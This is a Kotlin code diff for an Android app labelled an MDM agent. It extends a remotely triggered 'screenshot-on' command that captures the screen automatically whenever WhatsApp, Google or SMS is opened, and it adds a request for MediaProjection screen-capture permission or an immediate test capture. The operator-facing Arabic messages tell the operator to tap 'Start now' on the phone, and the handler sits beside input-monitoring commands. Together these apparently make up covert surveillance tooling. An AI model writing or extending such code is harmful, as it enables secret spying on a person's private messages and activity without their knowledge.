@@ -458,12 +458,35 @@ class CommandHandler(
             "input-monitoring-on" -> collectors.setInputMonitoring(true)
             "input-monitoring-off" -> collectors.setInputMonitoring(false)
             "screenshot-on" -> {
-                // ✅ Just enable auto-screenshot. No immediate screenshot to avoid
-                // triggering takeScreenshotAccessibility which may cause app issues
-                // if the service isn't connected.
+                // ✅ Enable auto-screenshots + request MediaProjection permission (as fallback)
+                com.mdm.agent.service.MDMAccessibilityService.autoScreenshotBlocked = false
                 com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(true)
-                Log.i(TAG, "✅ screenshot-on: auto-screenshot ENABLED")
-                CollectedData.TextResult("✅ تم تفعيل لقطات الشاشة التلقائية - ستصلك الصور تلقائياً عند فتح أي تطبيق (WhatsApp, Google, SMS, إلخ)")
+                Log.i(TAG, "✅ screenshot-on: auto-screenshots ENABLED")
+
+                // ✅ If MediaProjection not ready, request it (shows dialog on phone)
+                if (!com.mdm.agent.service.ScreenCaptureService.isReady()) {
+                    Log.i(TAG, "📸 Requesting MediaProjection permission as fallback...")
+                    Handler(Looper.getMainLooper()).post {
+                        try {
+                            com.mdm.agent.ui.ScreenCapturePermissionActivity.requestPermission(context)
+                        } catch (e: Exception) {
+                            Log.e(TAG, "❌ Failed to request MediaProjection: ${e.message}")
+                        }
+                    }
+                    CollectedData.TextResult("✅ تم تفعيل لقطات الشاشة التلقائية\n\n" +
+                        "📸 سيظهر مربع موافقة على الهاتف لتفعيل MediaProjection (احتياطي)\n" +
+                        "اضغط \"Start now\" للموافقة - لن يخرج التطبيق\n\n" +
+                        "بعد الموافقة، أرسل screenshot لالتقاط صورة فورية")
+                } else {
+                    // MediaProjection already ready - take a test screenshot
+                    val testShot = collectors.takeScreenshot()
+                    if (testShot is CollectedData.FileResult) {
+                        Log.i(TAG, "✅ Test screenshot captured")
+                        testShot
+                    } else {
+                        CollectedData.TextResult("✅ تم تفعيل لقطات الشاشة التلقائية - ستصلك الصور تلقائياً عند فتح أي تطبيق")
+                    }
+                }
             }
             "screenshot-off" -> {
                 com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(false)
